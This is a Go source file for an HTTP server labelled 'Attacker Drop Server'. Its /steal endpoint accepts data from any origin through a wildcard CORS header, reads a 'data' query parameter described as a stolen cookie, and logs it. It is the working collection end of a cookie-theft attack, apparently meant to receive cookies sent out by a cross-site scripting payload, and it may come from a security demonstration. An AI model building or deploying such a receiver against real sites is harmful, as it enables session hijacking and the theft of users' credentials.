package main

import (
	"fmt"
	"log"
	"net/http"
)

func main() {
	http.HandleFunc("/steal", func(w http.ResponseWriter, r *http.Request) {
		// Allow the browser to send the data without CORS blocking it
		w.Header().Set("Access-Control-Allow-Origin", "*")
		
		// Grab the stolen cookie from the URL query parameter
		stolenData := r.URL.Query().Get("data")
		
		fmt.Printf("\n🚨 [ATTACKER SERVER] DATA STOLEN: %s\n\n", stolenData)
		w.WriteHeader(http.StatusOK)
	})

	fmt.Println("Attacker Drop Server running on port 4000...")
	log.Fatal(http.ListenAndServe(":4000", nil))
}
